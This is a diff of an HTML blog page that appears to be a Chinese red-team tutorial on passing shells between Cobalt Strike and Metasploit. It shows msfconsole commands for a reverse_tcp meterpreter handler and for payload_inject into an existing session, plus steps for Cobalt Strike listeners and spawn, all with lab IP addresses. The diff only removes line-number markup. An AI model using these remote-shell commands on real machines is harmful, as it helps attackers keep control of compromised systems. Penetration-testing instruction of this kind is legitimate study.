@@ -2,10 +2,10 @@
 <h3 id="CS-Shell-♻️-MSF-Session"><a href="#CS-Shell-♻️-MSF-Session" class="headerlink" title="CS Shell ♻️ MSF Session"></a>CS Shell ♻️ MSF Session</h3><p>条件是 CS 已经拿到一个 shell，且该机器已上线。</p>
 <ol>
 <li><p>📍 首先 msf 利用 handler 模块监听：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt; use exploit/multi/handler</span><br><span class="line">msf5&gt; set LHOST 172.16.232.253 			//kali监听的IP</span><br><span class="line">msf5&gt; set LPORT 4747</span><br><span class="line">msf5&gt; exploit</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5&gt; use exploit/multi/handler</span><br><span class="line">msf5&gt; set LHOST 172.16.232.253 			//kali监听的IP</span><br><span class="line">msf5&gt; set LPORT 4747</span><br><span class="line">msf5&gt; exploit</span><br></pre></td></tr></table></figure>
 
 <p>或者一句话命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt; handler -p windows/meterpreter/reverse_tcp -H 172.16.232.253 -P 4747 -x</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5&gt; handler -p windows/meterpreter/reverse_tcp -H 172.16.232.253 -P 4747 -x</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>📍 CS 中新建一个 Listener，设置为 windows/foreign/reverse_tcp，IP 和端口均填写 <em>kali</em> 的 IP 和端口。然后右键会话 👉🏻 spawn 👉🏻 选择刚才建立的 listener。或者在 session 处直接用命令：<code>spawn xxx</code>。然后 msf 会弹回 meterpreter 会话。</p>
 </li>
@@ -17,7 +17,7 @@
 <p>⚠️ 这里必须选择 windows/beacon_http/reverse_http</p>
 </li>
 <li><p>msf 利用 <em>payload_inject</em> 模块：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 此时已获得有效的 session</span><br><span class="line">msf5&gt; use exploit/windows/local/payload_inject</span><br><span class="line">msf5&gt; set payload windows/meterpreter/reverse_http</span><br><span class="line">msf5&gt; set disablepayloadhandler true</span><br><span class="line">msf5&gt; set LHOST 172.16.232.1</span><br><span class="line">msf5&gt; set LPORT 9687</span><br><span class="line">msf5&gt; set session 2</span><br><span class="line">msf5&gt; exploit</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 此时已获得有效的 session</span><br><span class="line">msf5&gt; use exploit/windows/local/payload_inject</span><br><span class="line">msf5&gt; set payload windows/meterpreter/reverse_http</span><br><span class="line">msf5&gt; set disablepayloadhandler true</span><br><span class="line">msf5&gt; set LHOST 172.16.232.1</span><br><span class="line">msf5&gt; set LPORT 9687</span><br><span class="line">msf5&gt; set session 2</span><br><span class="line">msf5&gt; exploit</span><br></pre></td></tr></table></figure>
 
 </li>
 </ol>
